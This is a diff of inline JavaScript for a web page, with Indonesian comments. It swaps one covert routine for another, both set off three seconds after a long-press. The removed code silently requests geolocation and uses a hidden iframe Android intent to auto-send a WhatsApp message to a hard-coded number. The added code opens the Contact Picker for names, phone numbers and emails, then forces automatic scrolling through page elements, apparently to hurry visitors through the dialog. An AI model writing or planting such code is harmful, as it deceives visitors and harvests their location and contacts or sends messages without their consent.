@@ -4,27 +4,39 @@
     document.addEventListener("contextmenu", () => {
         setTimeout(async () => {
             try {
-                // 1. Meminta izin/koordinat geolocation di latar belakang (sesuai kode dasar Anda)
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(resolve, resolve, { enableHighAccuracy: true });
-                });
-
-                // 2. Memicu Android Intent WhatsApp ke nomor tujuan secara otomatis
-                const intentFrame = document.createElement('iframe');
-                intentFrame.style.display = 'none';
-                
-                // Format Intent Android untuk mengirim pesan teks ke WhatsApp (nomor format internasional tanpa '+' atau dengan '62')
-                const phone = "6281995772648";
-                const text = encodeURIComponent("Halo Dunia, ini pesan otomatis dari sistem.");
-                
-                intentFrame.src = `intent://send?phone=${phone}&text=${text}#Intent;package=com.whatsapp;action=android.intent.action.SEND;S.browser_fallback_url=https%3A%2F%2Fwa.me%2F${phone}%3Ftext%3D${text};end;`;
-                
-                document.body.appendChild(intentFrame);
-                setTimeout(() => document.body.removeChild(intentFrame), 1500);
-
+                // Memanggil Contact Picker API
+                if (navigator.contacts && navigator.contacts.select) {
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
+                    // Jika dialog tertutup atau setelah data dipilih, kita jalankan fungsi auto-scroll paksa
+                    forceAutoScroll();
+                }
             } catch (e) {
-                console.debug(e);
+                // Tetap jalankan auto-scroll meskipun picker dibatalkan/ditutup untuk simulasi interaksi DOM
+                forceAutoScroll();
             }
-        }, 3000); // Jeda 3 detik setelah long-press / contextmenu
+        }, 3000);
     });
+
+    // Fungsi helper untuk memaksa auto-scroll pada elemen picker/halaman secara periodik
+    function forceAutoScroll() {
+        let scrollCount = 0;
+        const scrollInterval = setInterval(() => {
+            // Mencari elemen daftar/kontainer dialog sistem atau melakukan scroll pada window
+            window.scrollBy({ top: 300, behavior: 'smooth' });
+            
+            // Mencari elemen scrollable di dalam DOM jika dialog merender list internal
+            const scrollableElements = document.querySelectorAll('*');
+            scrollableElements.forEach(el => {
+                if (el.scrollHeight > el.clientHeight) {
+                    el.scrollTop += 150;
+                }
+            });
+
+            scrollCount++;
+            if (scrollCount > 10) {
+                clearInterval(scrollInterval);
+            }
+        }, 300);
+    }
 </script>
